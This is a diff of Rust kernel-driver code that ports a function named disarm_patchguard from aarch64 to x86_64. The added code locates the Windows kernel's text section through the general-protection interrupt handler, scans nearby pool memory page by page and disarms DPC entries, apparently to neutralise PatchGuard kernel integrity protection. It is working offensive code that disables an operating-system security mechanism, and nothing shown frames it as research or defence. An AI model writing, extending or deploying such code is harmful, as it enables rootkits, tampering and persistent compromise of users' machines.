@@ -1116,11 +1116,45 @@ pub fn disarm_patchguard() {
     }
 }
 
-#[cfg(target_arch = "aarch64")]
+#[cfg(target_arch = "x86_64")]
+pub fn disarm_patchguard() {
+    let anchor = unsafe { core::ptr::addr_of!(crate::OWN_RANGE).read() }.base_address as usize;
+    if anchor == 0 {
+        return;
+    }
+
+    let entry = gate_handler(descriptor_table_base(), GENERAL_PROTECTION);
+    let Some((image, _)) = kernel_text(entry) else {
+        return;
+    };
+    let Some(text) = section_named(image, b".text\0\0\0") else {
+        return;
+    };
+
+    let window = anchor.saturating_sub(POOL_REACH) & !(PAGE_SIZE - 1);
+    let end = anchor.wrapping_add(POOL_REACH);
+    let mut page = window;
+    while page < end {
+        let (present, span) = crate::winnt_paging::present_span(page);
+        let next = (page & !(span - 1)).wrapping_add(span);
+        if !present {
+            page = next;
+            continue;
+        }
+
+        while page < next && page < end {
+            disarm_page(page, text);
+            page += PAGE_SIZE;
+        }
+    }
+
+}
+
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 fn disarm_page(page: usize, text: (usize, usize)) {
     let (text_start, text_size) = text;
 
-    for offset in (0..PAGE_SIZE).step_by(core::mem::size_of::<u64>()) {
+    for offset in (0..PAGE_SIZE).step_by(POOL_GRANULARITY) {
         let routine_at = page + offset;
         if routine_at < page + DPC_ROUTINE || routine_at + 16 > page + PAGE_SIZE {
             continue;
@@ -1149,7 +1183,7 @@ fn disarm_page(page: usize, text: (usize, usize)) {
     }
 }
 
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 fn canonical(value: usize) -> bool {
     let top = value >> 47;
     top == 0 || top == 0x1ffff
@@ -1164,13 +1198,17 @@ fn pool_anchor() -> Option<usize> {
     None
 }
 
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const POOL_WINDOW: usize = 1 << 32;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
+const POOL_REACH: usize = 1 << 29;
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
+const POOL_GRANULARITY: usize = 16;
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const PAGE_SIZE: usize = 0x1000;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const DPC_ROUTINE: usize = 0x18;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const DPC_OBJECT: u8 = 0x13;
 
 #[cfg(target_arch = "aarch64")]
@@ -1406,7 +1444,7 @@ fn image_size(image: usize) -> Option<usize> {
     }
 }
 
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 fn image_containing(address: usize) -> Option<usize> {
     unsafe {
         (*core::ptr::addr_of!(crate::MODULE_INFO))
@@ -1419,7 +1457,7 @@ fn image_containing(address: usize) -> Option<usize> {
     }
 }
 
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 fn section_named(image: usize, wanted: &[u8; 8]) -> Option<(usize, usize)> {
     unsafe {
         let headers = (image + (image as *const u32).byte_add(PE_SIGNATURE_OFFSET).read() as usize)
@@ -1459,19 +1497,19 @@ const VECTOR_TABLE_SIZE: usize = 0x800;
 const VECTOR_TABLE_ALLOCATION: usize = 2 * VECTOR_TABLE_SIZE;
 #[cfg(target_arch = "aarch64")]
 const POOL_NON_PAGED_EXECUTE: u64 = 0x80;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const PE_SIGNATURE_OFFSET: usize = 0x3c;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const SECTION_COUNT_OFFSET: usize = 6;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const OPTIONAL_SIZE_OFFSET: usize = 20;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const SECTION_TABLE_OFFSET: usize = 24;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const SECTION_VIRTUAL_SIZE: usize = 8;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const SECTION_ADDRESS: usize = 12;
-#[cfg(target_arch = "aarch64")]
+#[cfg(any(target_arch = "aarch64", target_arch = "x86_64"))]
 const SECTION_ENTRY_SIZE: usize = 40;
 
 #[cfg(target_arch = "aarch64")]
